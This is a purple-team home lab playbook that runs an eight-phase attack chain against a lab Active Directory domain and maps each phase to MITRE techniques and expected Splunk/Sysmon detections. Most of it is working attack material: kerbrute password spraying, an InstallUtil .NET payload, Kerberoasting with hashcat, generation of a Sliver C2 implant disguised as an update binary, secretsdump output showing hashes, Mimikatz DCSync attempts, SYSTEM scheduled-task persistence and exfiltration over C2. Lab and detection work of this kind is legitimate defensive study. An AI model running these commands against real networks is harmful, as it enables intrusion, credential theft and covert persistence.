**English** · **[Srpski](02_attack_playbook.sr.md)**

# Purple Team Home Lab — Attack Playbook

## 8-PHASE OVERVIEW

| # | Phase | Tooling | MITRE | Status |
|---|---|---|---|---|
| 1 | Reconnaissance | nmap, kerbrute, nxc, certipy | T1046, T1087, T1018 | ✅ Works |
| 2 | Password Spraying | kerbrute | T1110.003 | ✅ Works |
| 3 | Execution (LOLBins) | InstallUtil.exe + .NET payload | T1218.004 | ✅ Works |
| 4 | Kerberoasting | impacket-GetUserSPNs | T1558.003 | ✅ Works |
| 5 | Lateral Movement | Sliver C2 mTLS | T1071.001 | ✅ Works |
| 6 | Credential Dumping | reg save SAM/SYSTEM, secretsdump | T1003.002/.005/.006 | ✅ Local works, ❌ DCSync failed (AMSI + DRS bind) |
| 7 | Persistence | schtasks (LogonTrigger) | T1053.005 | ✅ Works |
| 8 | C2 + Exfiltration | Sliver mTLS port 443 | T1071.001, T1041 | ✅ Works (evasion successful) |

---

## PHASE 1 — RECONNAISSANCE

**MITRE:** T1046 (Network Service Discovery), T1087 (Account Discovery), T1018 (Remote System Discovery)

### Goal
Identify AD infrastructure, users, open services, and AD CS misconfigurations before the attack.

### Commands (from Kali, terminal)

```bash
# 1.1 Network sweep
nmap -sV 192.168.182.0/24

# 1.2 SMB enumeration of the DC (port 445 may be blocked from Kali → expect timeout)
nmap -p 445 --script smb-os-discovery 192.168.182.135

# 1.3 NetExec SMB enumeration
nxc smb 192.168.182.135

# 1.4 NetExec LDAP enumeration (port 389 works)
nxc ldap 192.168.182.135 -u '' -p '' --users

# 1.5 Kerbrute — userenum (port 88 works)
echo -e "Administrator\nSQLService\ntstark\nfcastle\npparker\nGuest\nfrankcastle\npeterparker" > /tmp/users.txt
./kerbrute userenum --dc 192.168.182.135 -d MARVEL.LOCAL /tmp/users.txt

# 1.6 BloodHound enumeration (with the compromised account)
bloodhound-python -c All -u fcastle -p Password1 -d MARVEL.LOCAL -ns 192.168.182.135

# 1.7 ASREPRoast check (anyone with pre-auth disabled?)
impacket-GetNPUsers MARVEL.LOCAL/ -dc-ip 192.168.182.135 -no-pass -usersfile /tmp/users.txt

# 1.8 AD CS discovery (critical — Certipy)
certipy-ad find -u fcastle@MARVEL.LOCAL -p Password1 -dc-ip 192.168.182.135
```

### Expected results

- 5 live hosts (DC, 2x Win10, Kali, Splunk)
- LDAP enumeration: MARVEL.LOCAL user list
- Kerbrute confirms which users exist
- BloodHound dump JSON files for visualization
- ASREPRoast: no user is vulnerable (all have pre-auth)
- **Certipy findings:**
  - CA: MARVEL-HYDRA-DC-CA
  - 33 templates, 11 enabled
  - ESC1/2/3/15 on SubCA template, ESC4 on most templates
  - Note: all ESC findings are DA-scan artifacts — scan run as fcastle (Domain Admin). SubCA enrollment requires DA rights; no unprivileged ESC path exists in this lab.

### Commands that do NOT work (and why)

- `impacket-secretsdump` directly against the DC → port 445 blocked ❌
- `certipy-ad req` ESC1 exploitation → port 135 RPC blocked ❌
- `certipy-ad relay` → web enrollment disabled ❌

---

## PHASE 2 — PASSWORD SPRAYING

**MITRE:** T1110.003 (Password Spraying)

### Goal
Find an account with a weak password — one password across all accounts, so each account gets exactly one failed attempt and the lockout policy never triggers.

### Pre-spray (recon)

Check the lockout policy first.

```bash
# If you have any account, check the policy:
nxc smb 192.168.182.135 -u fcastle -p Password1 --pass-pol
```

### Commands

```bash
# 2.1 Prepare the user list (only accounts confirmed in Phase 1)
cat > /tmp/users_clean.txt << EOF
Administrator
SQLService
fcastle
frankcastle
peterparker
pparker
Guest
EOF

# 2.2 SPRAY — we avoid lockout with ONE password per account, NOT with delay.
# --delay is in milliseconds (100ms) — just throttling, nothing to do with lockout.
# Lockout would only trigger if we hit the same account multiple times.
./kerbrute passwordspray --dc 192.168.182.135 -d MARVEL.LOCAL /tmp/users_clean.txt 'Password1' --delay 100

# Result:
# [+] VALID LOGIN: fcastle@MARVEL.LOCAL:Password1
```

### Expected Splunk events

- **EC4771** — Kerberos pre-auth failed (all failed attempts)
- **EC4768** — TGT issued (when Password1 succeeds for fcastle)
- **EC4625** — Account failed to log on (if kerbrute falls back to NTLM)

---

## PHASE 3 — EXECUTION (LOLBins)

**MITRE:** T1218.004 (InstallUtil), T1059 (Command and Scripting Interpreter)

### Goal
Run a payload through a Microsoft-signed binary (InstallUtil.exe) instead of powershell.exe directly. Less suspicious, bypasses some AV policies.

### Payload prep (from Kali)

```bash
# 3.1 Create a .NET install payload with Mono mcs
cat > /tmp/Punisher.cs << 'EOF'
using System;
using System.Configuration.Install;
using System.Diagnostics;
using System.Runtime.InteropServices;

[System.ComponentModel.RunInstaller(true)]
public class Punisher : Installer
{
    public override void Uninstall(System.Collections.IDictionary savedState)
    {
        // Execution starts here when InstallUtil /U is called
        Process.Start("cmd.exe", "/c whoami > C:\\Temp\\pwned.txt && hostname >> C:\\Temp\\pwned.txt");
    }
}
EOF

# 3.2 Compile with Mono mcs
mcs -target:library -r:/usr/lib/mono/4.5/System.Configuration.Install.dll /tmp/Punisher.cs -out:/tmp/share/GlobalProtect_Update.dll
```

### Delivery and execution (on THEPUNISHER)

```powershell
# 3.3 Fetch the payload over the SMB share (Kali SMB server must be running)
copy \\192.168.182.133\share\GlobalProtect_Update.dll C:\Temp\GlobalProtect_Update.dll

# 3.4 Run via InstallUtil (LOLBin)
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Temp\GlobalProtect_Update.dll
```

### Expected result

- `C:\Temp\pwned.txt` created with `whoami` and `hostname` output
- Sysmon EC1 shows the parent-child chain: InstallUtil.exe → cmd.exe → whoami.exe
- EC4688 with command line `InstallUtil.exe`

### Defender behavior

- Defender does **NOT block** InstallUtil — it is a Microsoft-signed binary
- Defender does **NOT block** GlobalProtect_Update.dll because it is in the `C:\Temp` exclusion path
- AMSI does **NOT block** because InstallUtil does not go through the PowerShell AMSI scan

---

## PHASE 4 — KERBEROASTING

**MITRE:** T1558.003 (Kerberoasting)

### Goal
Extract the TGS hash of a service account with an SPN, crack it offline to recover the password.

### Commands (from Kali)

```bash
# 4.1 GetUserSPNs — find all accounts with an SPN
impacket-GetUserSPNs MARVEL.LOCAL/fcastle:Password1 -dc-ip 192.168.182.135 -request

# Result:
# $krb5tgs$23$*SQLService$MARVEL.LOCAL$MARVEL.LOCAL/SQLService*$xxx...

# 4.2 Save the hash to a file
impacket-GetUserSPNs MARVEL.LOCAL/fcastle:Password1 -dc-ip 192.168.182.135 -request -outputfile /tmp/kerberoast.hashes

# 4.3 Crack with hashcat (mode 13100 = Kerberos 5 TGS-REP etype 23)
hashcat -m 13100 /tmp/kerberoast.hashes /usr/share/wordlists/rockyou.txt --force

# Result: MYpassword123#
```

### Expected Splunk events

- **EC4769** — Kerberos service ticket requested
  - **Ticket Encryption Type: 0x17 (RC4-HMAC)** — the key indicator!
  - Account: fcastle (request from)
  - Service: SQLService@MARVEL.LOCAL

---

## PHASE 5 — LATERAL MOVEMENT (Sliver C2)

**MITRE:** T1071.001 (Web Protocols), T1572 (Protocol Tunneling)

### Goal
Establish a persistent C2 channel with THEPUNISHER as the domain-joined platform for attacks against the DC.

### Sliver server setup (from Kali)

```bash
# 5.1 Start the Sliver server
sudo sliver-server
```

Inside the Sliver console:
```
# 5.2 Set up an mTLS listener on port 443
mtls --lport 443

# 5.3 Generate a Windows implant
generate --mtls 192.168.182.133:443 --os windows --arch amd64 --format exe --save /tmp/

# Output: /tmp/INTENSIVE_WARLOCK.exe (Sliver assigns a random codename per build)
```

### Prepare delivery (Kali, second terminal)

```bash
# 5.4 Rename the implant (recommended — legitimate name = masquerading)
sudo cp /tmp/INTENSIVE_WARLOCK.exe /tmp/share/GlobalProtect_Update.exe

# 5.5 Start the SMB share
sudo impacket-smbserver share /tmp/share -smb2support
```

### Execution on THEPUNISHER (via Sliver shell or manually)

```cmd
copy \\192.168.182.133\share\GlobalProtect_Update.exe C:\Temp\GlobalProtect_Update.exe
C:\Temp\GlobalProtect_Update.exe
```

### Session verification (Sliver console)

```
sessions
use <session_id>
whoami
pwd
```

### Lateral test — check connectivity to the DC

```
# From the Sliver shell:
shell
```

```powershell
Test-NetConnection -ComputerName 192.168.182.135 -Port 445
Test-NetConnection -ComputerName 192.168.182.135 -Port 135
ping 192.168.182.135
```

### Expected Splunk events

- **Sysmon EC1** — Process Create: `GlobalProtect_Update.exe`
- **Sysmon EC3** — Network Connect: 192.168.182.133:443 (only if the process is on the watchlist — not caught by default)
- **EC4688** — `GlobalProtect_Update.exe` started

---

## PHASE 6 — CREDENTIAL DUMPING

**MITRE:** T1003.002 (SAM), T1003.005 (Cached Domain Credentials), T1003.006 (DCSync — attempted, failed)

### Goal
Extract local and cached domain credentials from the compromised machine.

### Commands (from the Sliver shell)

```powershell
# 6.1 Establish an SMB connection to the DC
net use \\192.168.182.135\IPC$ /user:MARVEL\fcastle Password1

# 6.2 Save registry hives locally
reg save HKLM\SAM C:\Temp\sam.hive       # ✅ succeeded
reg save HKLM\SYSTEM C:\Temp\system.hive  # ❌ Access is denied — SYSTEM requires SeBackupPrivilege (UAC split token in Sliver shell)
reg save HKLM\SECURITY C:\Temp\security.hive # ✅ succeeded

# Without the SYSTEM hive there is no bootkey → local SAM dump cannot be decrypted.
# Successful credential dump went via remote secretsdump (RemoteRegistry) — see below.
```

### Extraction — remote (successful path)

```bash
# Remote secretsdump reads hives directly via RemoteRegistry — no local file copy needed
sudo impacket-secretsdump MARVEL.LOCAL/fcastle:Password1@192.168.182.137
```

### What you get

```
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435...:fbdcd5041c96ddbd82224270b57f11fc:::
frankcastle:1001:aad3b435...:64f12cddaa88057e06a81b54e73b949b:::
SUPERMAN:1002:aad3b435...:2b576acbe6bcfda7294d6bd18041b8fe:::

[*] Dumping cached domain logon information
MARVEL.LOCAL/Administrator:$DCC2$10240#Administrator#c7154f935b7d1ace4c1d72bd4fb7889c
MARVEL.LOCAL/fcastle:$DCC2$10240#fcastle#e6f48c2526bd594441d3da3723155f6f

[*] Dumping LSA Secrets
$MACHINE.ACC:aad3b435...:d770bd67e3abc0203eff3c20cf595db2
dpapi_machinekey:0x57a7e865c5b2fb91eef0506730aed4ccbb6938e0
NL$KM:1f523cfbda5fdb429fb1a2b324c1eca0...
```

### DCSync — attempted, FAILED

```powershell
# 6.4 Mimikatz DCSync (BLOCKED BY AMSI)
C:\Temp\mimikatz.exe "privilege::debug" "lsadump::dcsync /user:krbtgt /domain:MARVEL.LOCAL" "exit"
# Result: "This script contains malicious content and has been blocked by your antivirus software"

# 6.5 SharpKatz alternative (AMSI-evading, compiled .NET)
C:\Temp\SharpKatz.exe --Command dcsync --User krbtgt --Domain MARVEL.LOCAL --DomainController 192.168.182.135
# Result: "Error: 1825 - Error DC bind with default Guid" (RPC_S_SEC_PKG_ERROR)
# Reason: Kerberos/auth error at the DRS bind (transport layer), NOT access-denied.
#         fcastle IS a Domain Admin and DOES hold replication rights (nested BUILTIN\Administrators).
```

### Blue-team narrative — conclusion

**DCSync never succeeded — but NOT because of permissions:**
1. Defender + AMSI blocked the Mimikatz PowerShell invocation (a known tool, cut before execution)
2. SharpKatz (AMSI-evading) passed AV, but failed at the DRS bind — RPC 1825, a Kerberos/auth error at the transport layer

**Why this is a stronger blue-team story than "no privileges":**
- AMSI stops the **tool**, not the **technique** — that is the control that actually worked
- fcastle is a Domain Admin (nested `BUILTIN\Administrators`) and **DOES hold** `DS-Replication-Get-Changes` / `-All` — privilege was never the barrier
- The control that would actually detect DCSync is SACL auditing — EC4662 with replication GUIDs (visibility, not prevention)
- The durable fix is **least privilege** — tiering admin accounts (Tier 0 isolation) so a compromised endpoint-admin can't reach a DA and abuse replication rights, not relying on AV signatures → Lab v2

### Expected Splunk events

- **EC4688** with command line `reg.exe save HKLM\SAM`, `HKLM\SYSTEM`, `HKLM\SECURITY` — critical indicator
- **EC4688** with `net.exe use \\192.168.182.135\IPC$` — auth attempt against the DC
- **Defender Operational log (EC1116/1117)** — Mimikatz signature blocks
- **Sysmon EC11** — File Create for sam.hive, system.hive, security.hive
- **EC4662** with replication GUIDs — the DCSync signature (requires SACL auditing on the DC)

---

## PHASE 7 — PERSISTENCE

**MITRE:** T1053.005 (Scheduled Task/Job)

### Goal
Establish persistence — keep the implant alive after reboot.

### Commands (from the Sliver shell)

```powershell
# 7.1 Pre-flight — confirm audit policy captures task creation
auditpol /get /subcategory:"Other Object Access Events"
# If "No Auditing":
auditpol /set /subcategory:"Other Object Access Events" /success:enable /failure:enable

# 7.2 Create a scheduled task — LogonTrigger
schtasks /create /tn "WindowsUpdateService" /tr "C:\Temp\GlobalProtect_Update.exe" /sc onlogon /ru SYSTEM /f

# 7.3 Verify
schtasks /query /tn "WindowsUpdateService"
```

### Persistence test

```powershell
# Logoff/logon or reboot — the task will launch the implant
# If using Sliver, you'll see a new session in the console
```

### Expected Splunk events

- **EC4698** — Scheduled Task Created
  - Task Name: `\WindowsUpdateService`
  - Author: `THEPUNISHER\frankcastle`
  - Command: `C:\Temp\GlobalProtect_Update.exe`
  - Trigger: `LogonTrigger`
  - Principal: `S-1-5-18` (SYSTEM)

---

## PHASE 8 — C2 + EXFILTRATION

**MITRE:** T1071.001 (Web Protocols), T1041 (Exfiltration Over C2 Channel)

### Goal
Demonstrate ongoing C2 communication and exfiltration over the Sliver mTLS channel.

### Setup

Sliver C2 has been running since Phase 5. Beaconing goes to port 443 toward Kali.

### Exfiltration test (from the Sliver console)

```
# 8.1 From the compromised machine, collect loot
shell
```

```powershell
# Create a fake "sensitive" file
echo "Top secret data: customer database backup" > C:\Temp\loot.txt
exit
```

```
# 8.2 Exfiltrate over the Sliver channel
download C:\Temp\loot.txt
```

### C2 beaconing analysis

Sliver beacon patterns:
- Default interval: 60 seconds
- Jitter: 30%
- Protocol: mTLS on port 443
- Destination IP: 192.168.182.133 (Kali)
- Process: `GlobalProtect_Update.exe`

### Expected Splunk events (KEY for the blue-team narrative)

**Default Sysmon config does NOT capture Sliver beaconing** because NetworkConnect is not enabled for processes from user-writable paths (default Sysmon doesn't log every outbound connect).

```spl
# This query will NOT show Sliver
index=main source="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=3
  dst_port=443
```

**Detection iteration — behavioral, NOT by filename:**

The naive fix would be to add `GlobalProtect_Update.exe` to a watchlist. That's an anti-pattern —
the attacker renames the binary and the detection dies. We detect **location + behavior**,
not the name: any process from a user-writable path that initiates egress.

```xml
<NetworkConnect onmatch="include">
  <!-- any process from a user-writable path making a network connection -->
  <Image condition="contains">\Temp\</Image>
  <Image condition="contains">\AppData\</Image>
  <Image condition="contains">\ProgramData\</Image>
  <Image condition="contains">\Users\Public\</Image>
</NetworkConnect>
```

After restarting Sysmon, re-run the implant — Splunk captures EC3 with the Kali destination.
Fidelity is raised by beacon-interval analysis (Sliver default 60s ± 30%), not the process name.
The vendor-agnostic version is Sigma rule 7 in `detections/sigma/sigma_rules.yml`.

---
